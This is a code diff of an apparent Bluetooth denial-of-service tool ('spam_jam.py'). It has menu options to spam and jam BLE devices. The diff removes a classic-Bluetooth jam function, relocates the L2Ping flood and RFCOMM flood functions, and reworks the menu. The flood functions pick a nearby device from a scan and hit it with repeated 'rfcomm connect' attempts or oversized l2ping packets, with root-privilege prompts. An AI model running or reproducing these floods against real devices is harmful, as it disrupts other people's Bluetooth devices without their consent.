@@ -33,7 +33,7 @@ def interactive_ble_scan():
     print("🔎 Scanning for BLE devices nearby...")
     scanner = Scanner()
     try:
-        devices = scanner.scan(10.0)
+        devices = list(scanner.scan(10.0))
         if not devices:
             print("⚠️ No BLE devices found.")
             return []
@@ -43,90 +43,6 @@ def interactive_ble_scan():
     except BTLEException as e:
         print(f"⚠️ Scan failed: {e}")
         return []
-
-# 🔎 Classic Bluetooth Scan with Cute Output + Selection
-def scan_classic_devices():
-    print("🤖 Scanning for Classic Bluetooth devices...")
-    try:
-        output = subprocess.check_output(["hcitool", "scan"], stderr=subprocess.DEVNULL).decode()
-        lines = output.split("\n")[1:]  # Skip the first header line
-        results = []
-        for idx, line in enumerate(lines):
-            parts = line.strip().split("\t")
-            if len(parts) >= 2:
-                mac = parts[0]
-                name = parts[-1]
-                print(f"🔹 {idx}: {mac} — {name}")
-                results.append((mac, name))
-        return results
-    except Exception as e:
-        print(f"⚠️ Classic scan failed: {e}")
-        return []
-
-# 🎯 Classic RFCOMM Flood Targeted by Scan
-def classic_jam():
-    devices = scan_classic_devices()
-    if not devices:
-        return
-    try:
-        idx = int(input("💜 Enter index of classic device to RFCOMM flood: "))
-        target_mac = devices[idx][0]
-    except (ValueError, IndexError):
-        print("⚠️ Invalid selection.")
-        return
-
-    print(f"💥 Starting classic RFCOMM flood on {target_mac}...")
-    for i in range(1000):
-        try:
-            subprocess.run(["rfcomm", "connect", target_mac, "1"], check=True)
-            print(f"✅ Attempt {i+1}: Connected to {target_mac}")
-        except subprocess.CalledProcessError:
-            print(f"⚠️ Attempt {i+1}: Failed to connect to {target_mac}")
-
-# 💥 L2Ping Flood
-# 💥 L2Ping Flood
-def l2ping_attack():
-    devices = interactive_ble_scan()
-    if not devices:
-        return
-    try:
-        idx = int(input("💜 Enter index of device to L2Ping: "))
-        addr = devices[idx].addr
-    except (ValueError, IndexError):
-        print("⚠️ Invalid selection.")
-        return
-
-    if os.geteuid() != 0:
-        print("⚠️ L2Ping needs root! Try: sudo python3 spam_jam.py")
-        return
-
-    print(f"💥 Sending L2Ping flood to {addr}")
-    try:
-        subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
-        print("✅ L2Ping attack successful!")
-    except subprocess.CalledProcessError:
-        print(f"⚠️ Failed. Device may be offline.")
-
-
-# ✅ RFCOMM Flood
-def rfcomm_flood():
-    devices = interactive_ble_scan()
-    if not devices:
-        return
-    try:
-        idx = int(input("💜 Enter index of device for RFCOMM Flood: "))
-        addr = devices[idx].addr
-    except (ValueError, IndexError):
-        print("⚠️ Invalid selection.")
-        return
-
-    print(f"💥 Starting RFCOMM flood on {addr}...")
-    for i in range(1000):
-        try:
-            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
-            print(f"✅ Attempt {i+1}: Connected")
-        except subprocess.CalledProcessError:
-            print(f"⚠️ Attempt {i+1}: Failed")
 
 # 🚀 Spam Single BLE Device
 def spam_ble():
@@ -189,7 +105,7 @@ def jam_ble():
 
     scanner = Scanner()
     try:
-        devices = scanner.scan(15.0)
+        devices = list(scanner.scan(15.0))
     except BTLEException as e:
         print(f"⚠️ BLE Scan Failed: {e}")
         return
@@ -236,7 +152,7 @@ def jam_all_ble():
             print("\n🔁 Scanning for BLE devices to jam...")
             scanner = Scanner()
             try:
-                devices = scanner.scan(15.0)
+                devices = list(scanner.scan(15.0))
             except BTLEException as e:
                 print(f"⚠️ BLE Scan failed: {e}")
                 continue
@@ -276,7 +192,7 @@ def scan_bluetooth():
     subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     try:
         scanner = Scanner()
-        devices = scanner.scan(10.0)
+        devices = list(scanner.scan(10.0))
         if not devices:
             print("⚠️ No Bluetooth devices found.")
             return
@@ -284,6 +200,49 @@ def scan_bluetooth():
             print(f"🔹 {idx}: {d.addr} ({d.addrType}), RSSI={d.rssi} dB")
     except BTLEException as e:
         print(f"⚠️ Scan failed: {e}")
+
+# 💥 L2Ping Flood
+def l2ping_attack():
+    devices = interactive_ble_scan()
+    if not devices:
+        return
+    try:
+        idx = int(input("💜 Enter index of device to L2Ping: "))
+        addr = devices[idx].addr
+    except (ValueError, IndexError):
+        print("⚠️ Invalid selection.")
+        return
+
+    if os.geteuid() != 0:
+        print("⚠️ L2Ping needs root! Try: sudo python3 spam_jam.py")
+        return
+
+    print(f"💥 Sending L2Ping flood to {addr}")
+    try:
+        subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
+        print("✅ L2Ping attack successful!")
+    except subprocess.CalledProcessError:
+        print(f"⚠️ Failed. Device may be offline.")
+
+# ✅ RFCOMM Flood
+def rfcomm_flood():
+    devices = interactive_ble_scan()
+    if not devices:
+        return
+    try:
+        idx = int(input("💜 Enter index of device for RFCOMM Flood: "))
+        addr = devices[idx].addr
+    except (ValueError, IndexError):
+        print("⚠️ Invalid selection.")
+        return
+
+    print(f"💥 Starting RFCOMM flood on {addr}...")
+    for i in range(1000):
+        try:
+            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
+            print(f"✅ Attempt {i+1}: Connected")
+        except subprocess.CalledProcessError:
+            print(f"⚠️ Attempt {i+1}: Failed")
 
 # 🧠 Start Bluetooth Service
 def start_bluetooth():
@@ -295,25 +254,24 @@ def start_bluetooth():
 def main():
     print_banner()
     while True:
-        print("\n🔹 1️⃣ Start Bluetooth Service 📡")
-        print("🔹 2️⃣ Scan for Bluetooth devices 📡")
-        print("🔹 3️⃣ Spam a BLE device 💌")
-        print("🔹 4️⃣ Spam All BLE Devices 💌💥")
-        print("🔹 5️⃣ Jam a BLE device 🚫")
-        print("🔹 6️⃣ Jam All BLE Devices 🚫💥")
-        print("🔹 7️⃣ L2Ping Attack 💥")
-        print("🔹 8️⃣ RFCOMM Flood 💥")
-        print("🔹 9️⃣ Classic RFCOMM Jam 💣")
+        print("\n🔹 1 Start Bluetooth Service 📡")
+        print("🔹 2 Scan for Bluetooth devices 📡")
+        print("🔹 3 Spam a BLE device 💌")
+        print("🔹 4 Spam All BLE Devices 💌💥")
+        print("🔹 5 Jam a BLE device 🚫")
+        print("🔹 6 Jam All BLE Devices 🚫💥")
+        print("🔹 7 L2Ping Attack 💥")
+        print("🔹 8 RFCOMM Flood 💥")
+        print("🔹 9 Classic RFCOMM Jam 💣")
         print("🔹 🔟 Quit 🚪")
 
         choice = input("💜 Choose an option (1-10): ")
-        functions = [
-            start_bluetooth, scan_bluetooth, spam_ble, spam_all_ble,
-            jam_ble, jam_all_ble, l2ping_attack, rfcomm_flood,
-            classic_jam, sys.exit
-        ]
+        functions = [start_bluetooth, scan_bluetooth, spam_ble, spam_all_ble, jam_ble, jam_all_ble, l2ping_attack, rfcomm_flood, rfcomm_flood]
 
-        if choice in map(str, range(1, 11)):
+        if choice == "10":
+            print("👋 Goodbye, fren! XOXOXO 💜")
+            sys.exit()
+        elif choice in map(str, range(1, 10)):
             func = functions[int(choice)-1]
             if func:
                 func()
